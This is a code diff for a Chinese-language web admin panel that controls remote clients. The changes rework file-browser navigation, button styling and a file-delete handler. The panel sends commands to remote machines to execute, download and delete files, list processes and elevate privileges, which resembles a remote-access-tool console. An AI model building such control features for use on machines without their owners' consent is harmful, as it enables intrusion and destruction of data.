@@ -804,12 +804,6 @@ export default function Home() {
   const [downloadProgress, setDownloadProgress] = useState('')
   const [uploadFileName, setUploadFileName] = useState('')
 
-  useEffect(() => {
-    if (activeTab === 'remoteServer' && remoteServerAuthenticated) {
-      fetchClients()
-    }
-  }, [activeTab, remoteServerAuthenticated])
-
   const fetchClients = async () => {
     try {
       const response = await fetch('/api/admin/clients?action=list')
@@ -891,61 +885,6 @@ export default function Home() {
     }
   }
 
-  const navigateToParentDirectory = () => {
-    if (currentPath === '.' || currentPath === '/' || !currentPath.includes('\\')) {
-      getClientDirectory(selectedClient?.id || '', '.')
-      return
-    }
-    const parentPath = currentPath.split('\\').slice(0, -1).join('\\') || '.'
-    getClientDirectory(selectedClient?.id || '', parentPath)
-  }
-
-  const renderPathBreadcrumbs = () => {
-    if (currentPath === '.') {
-      return <span className="path-link">当前目录</span>
-    }
-    const parts = currentPath.split('\\')
-    let pathAccum = ''
-    return parts.map((part, index) => {
-      pathAccum = index === 0 ? part : `${pathAccum}\\${part}`
-      const isLast = index === parts.length - 1
-      return (
-        <span key={index}>
-          {index > 0 && <span className="path-separator">\\</span>}
-          {!isLast ? (
-            <button 
-              className="path-link"
-              onClick={() => getClientDirectory(selectedClient?.id || '', pathAccum)}
-            >
-              {part}
-            </button>
-          ) : (
-            <span className="path-link active">{part}</span>
-          )}
-        </span>
-      )
-    })
-  }
-
-  const handleDeleteClientFile = async (clientId: string, filePath: string) => {
-    if (!confirm(`确定要删除文件 "${filePath}" 吗？此操作不可恢复！`)) return
-    try {
-      await sendRemoteCommand(clientId, filePath, 'delete')
-      setTimeout(async () => {
-        const response = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}`)
-        const result = await response.json()
-        if (result.status === 'success' && result.result) {
-          showMessage(result.result.output || '文件删除成功', 'success')
-          getClientDirectory(clientId, currentPath)
-        } else {
-          showMessage('删除失败', 'error')
-        }
-      }, 1000)
-    } catch (error) {
-      showMessage('删除失败', 'error')
-    }
-  }
-
   const getClientProcesses = async (clientId: string) => {
     try {
       await sendRemoteCommand(clientId, '', 'processes')
@@ -1017,6 +956,20 @@ export default function Home() {
   const handleExecuteFile = (clientId: string, filePath: string) => {
     sendRemoteCommand(clientId, filePath, 'execute')
     showMessage('文件已执行', 'success')
+  }
+
+  const handleRemoteDeleteFile = (clientId: string, filePath: string, fileName: string) => {
+    if (!confirm(`确定要删除文件 "${fileName}" 吗？此操作不可恢复！`)) return
+    sendRemoteCommand(clientId, filePath, 'delete')
+    showMessage('文件已删除', 'success')
+    setTimeout(() => getClientDirectory(clientId, currentPath), 1000)
+  }
+
+  const handleGoBack = () => {
+    if (currentPath && currentPath !== '.' && currentPath !== '/') {
+      const parentPath = currentPath.substring(0, currentPath.lastIndexOf('\\')) || '.'
+      getClientDirectory(selectedClient!.id, parentPath)
+    }
   }
 
   const handleElevate = (clientId: string) => {
@@ -1123,12 +1076,12 @@ export default function Home() {
             </div>
           </div>
 
-          <div style={{ display: 'grid', gridTemplateColumns: '1fr 2fr', gap: '2rem' }}>
-            <div className="card client-list-card">
-              <h3>
-                <i className="fas fa-users"></i> 在线客户端 ({clients.filter(c => c.status === 'online').length}/{clients.length})
-              </h3>
-              <div className="client-list">
+            <div className="client-list-container">
+              <div className="card client-list-card">
+                <h3>
+                  <i className="fas fa-users"></i> 在线客户端 ({clients.filter(c => c.status === 'online').length}/{clients.length})
+                </h3>
+                <div className="client-list">
                 {clients.map((client) => (
                   <div 
                     key={client.id}
@@ -1173,10 +1126,12 @@ export default function Home() {
                 {clients.length === 0 && (
                   <p style={{ textAlign: 'center', color: '#666', padding: '2rem' }}>暂无在线客户端</p>
                 )}
+                </div>
               </div>
             </div>
 
-            <div className="client-panel">
+            <div className="client-panel-container">
+              <div className="client-panel">
               {selectedClient ? (
                 <div style={{ display: 'flex', flexDirection: 'column', gap: '2rem' }}>
                   <div className="card client-info-card">
@@ -1266,17 +1221,16 @@ export default function Home() {
                         <i className="fas fa-folder-open"></i> 文件浏览
                       </h3>
                       <div style={{ display: 'flex', gap: '0.5rem' }}>
-                        {currentPath !== '.' && (
-                          <button 
-                            className="btn" 
-                            onClick={() => navigateToParentDirectory()}
-                            style={{ background: '#95a5a6' }}
-                          >
-                            <i className="fas fa-arrow-up"></i> 上一级
-                          </button>
-                        )}
                         <button 
-                          className="btn" 
+                          className="btn btn-sm" 
+                          onClick={handleGoBack}
+                          disabled={currentPath === '.' || currentPath === '/'}
+                          style={{ background: '#95a5a6', opacity: (currentPath === '.' || currentPath === '/') ? 0.5 : 1, cursor: (currentPath === '.' || currentPath === '/') ? 'not-allowed' : 'pointer' }}
+                        >
+                          <i className="fas fa-arrow-left"></i> 返回
+                        </button>
+                        <button 
+                          className="btn btn-sm" 
                           onClick={() => getClientDirectory(selectedClient.id)}
                           style={{ background: '#3498db' }}
                         >
@@ -1285,21 +1239,18 @@ export default function Home() {
                       </div>
                     </div>
                     <div className="path-bar">
-                      <span className="path-label">当前路径:</span>
-                      <div className="path-links">
-                        {renderPathBreadcrumbs()}
-                      </div>
+                      当前路径: {currentPath}
                     </div>
                     <div className="file-browser">
                       {directoryItems.map((item, index) => (
                         <div key={`${item.name}-${index}`} className="browser-item">
                           <i className={`fas ${item.type === 'directory' ? 'fa-folder text-orange' : 'fa-file text-blue'}`}></i>
-                          <span className="item-name" onClick={() => item.type === 'directory' && getClientDirectory(selectedClient.id, item.path)}>{item.name}</span>
+                          <span className="item-name">{item.name}</span>
                           {item.size && <span className="item-size">{(item.size / 1024).toFixed(2)} KB</span>}
                           <div className="item-actions">
                             {item.type === 'directory' && (
                               <button 
-                                className="btn btn-sm" 
+                                className="btn btn-sm primary" 
                                 onClick={() => getClientDirectory(selectedClient.id, item.path)}
                               >
                                 <i className="fas fa-folder-open"></i> 进入
@@ -1308,20 +1259,20 @@ export default function Home() {
                             {item.type === 'file' && (
                               <>
                                 <button 
-                                  className="btn btn-sm" 
+                                  className="btn btn-sm success" 
                                   onClick={() => handleExecuteFile(selectedClient.id, item.path)}
                                 >
                                   <i className="fas fa-play"></i> 执行
                                 </button>
                                 <button 
-                                  className="btn btn-sm" 
+                                  className="btn btn-sm info" 
                                   onClick={() => handleDownloadFile(selectedClient.id, item.path)}
                                 >
                                   <i className="fas fa-download"></i> 下载
                                 </button>
                                 <button 
                                   className="btn btn-sm danger" 
-                                  onClick={() => handleDeleteClientFile(selectedClient.id, item.path)}
+                                  onClick={() => handleRemoteDeleteFile(selectedClient.id, item.path, item.name)}
                                 >
                                   <i className="fas fa-trash"></i> 删除
                                 </button>
